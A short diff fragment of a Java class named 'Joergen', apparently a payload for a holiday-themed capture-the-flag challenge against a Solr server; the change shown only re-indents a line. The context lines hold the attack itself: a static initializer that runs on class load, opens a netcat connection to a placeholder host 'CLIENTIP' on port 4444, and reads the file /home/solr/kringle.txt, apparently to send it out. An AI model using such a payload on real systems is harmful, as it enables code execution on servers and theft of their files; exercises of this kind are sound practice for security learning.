@@ -40,7 +40,7 @@ Santa
 import java.nio.file.*;
 
 public class Joergen {
-	static {
+  static {
     try {
       Process p=java.lang.Runtime.getRuntime().exec("nc CLIENTIP 4444");
       Path path=Paths.get("/home/solr/kringle.txt");
